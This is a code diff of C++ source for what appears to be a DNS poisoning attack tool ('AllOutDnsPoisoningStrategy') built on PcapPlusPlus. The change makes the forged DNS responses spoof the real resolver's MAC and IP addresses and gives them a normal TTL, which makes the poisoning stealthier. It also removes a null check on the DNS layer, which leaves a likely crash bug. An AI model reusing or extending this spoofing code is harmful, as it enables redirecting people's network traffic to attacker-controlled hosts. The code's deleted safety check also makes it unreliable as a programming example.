@@ -14,6 +14,8 @@
 #include <future>
 #include <stdexcept>
 
+// TODO (extract constant)
+
 const int DNS_PORT = 53;
 
 void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
@@ -40,8 +42,7 @@ void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
     }
 
     // if the packet is not a DNS request, ignore it
-    if (requestDnsLayer == nullptr ||
-        !(requestDnsLayer->getDnsHeader()->queryOrResponse == 0)) {
+    if (!(requestDnsLayer->getDnsHeader()->queryOrResponse == 0)) {
         return;
     }
     // try to get the query from the packet
@@ -51,10 +52,14 @@ void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
     }
 
     // craft response packet
-    pcpp::EthLayer ethResponse(device_->getMacAddress(),
+    pcpp::EthLayer ethResponse(requestEthLayer->getDestMac(),
                                requestEthLayer->getSourceMac());
-    pcpp::IPv4Layer ipResponse(device_->getIPv4Address(),
+    pcpp::IPv4Layer ipResponse(requestIpLayer->getDstIPv4Address(),
                                requestIpLayer->getSrcIPv4Address());
+
+    const int ipTTL = 64;
+    ipResponse.getIPv4Header()->timeToLive = ipTTL;
+
     pcpp::UdpLayer udpResponse(DNS_PORT, requestUdpLayer->getSrcPort());
 
     pcpp::DnsLayer dnsResponse;
